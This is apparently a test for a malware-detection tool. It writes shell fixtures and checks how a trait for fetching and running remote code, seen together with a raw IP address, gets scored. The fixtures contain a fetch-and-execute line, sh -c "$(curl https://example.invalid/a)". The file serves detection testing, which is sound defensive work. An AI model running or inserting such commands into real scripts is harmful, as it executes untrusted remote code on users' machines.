#!/usr/bin/env python3
"""Verify loose fetch and IP observations do not establish execution."""
import json
import os
from pathlib import Path
import subprocess
import tempfile

repo = Path(__file__).resolve().parents[2]
trait = 'objectives/execution/payload/script-eval/network/child::shell-ip-fetch-command-substitution'
cases = {
    'cooccurrence.sh': ('#!/bin/sh\n# sh -c "$(curl https://example.invalid/a)"\necho http://93.184.216.34/\n', 3),
    'no-fetch.sh': ('#!/bin/sh\necho http://93.184.216.34/\n', None),
    'no-ip.sh': ('#!/bin/sh\nsh -c "$(curl https://example.invalid/a)"\n', None),
}
with tempfile.TemporaryDirectory(prefix='shell-fetch-ip-') as tmp:
    paths = []
    for name, (content, _) in cases.items():
        path = Path(tmp) / name
        path.write_text(content)
        paths.append(str(path))
    env = os.environ.copy()
    env['CLEAVE_SKIP_CACHE'] = '1'
    result = subprocess.run([str((repo / '../cleave/target/release/cleave').resolve()), '--traits-dir', str(repo), '--format=json', *paths], check=True, capture_output=True, text=True, env=env)
    reports = [json.loads(line)['files'][0] for line in result.stdout.split('\n') if line]
    assert len(reports) == len(cases)
    for report in reports:
        name = Path(report['path']).name
        values = [t['crit'] for t in report.get('traits', []) if t['id'] == trait]
        assert (values[0] if values else None) == cases[name][1], (name, values, cases[name][1])
print('Shell fetch and IP co-occurrence boundaries passed.')
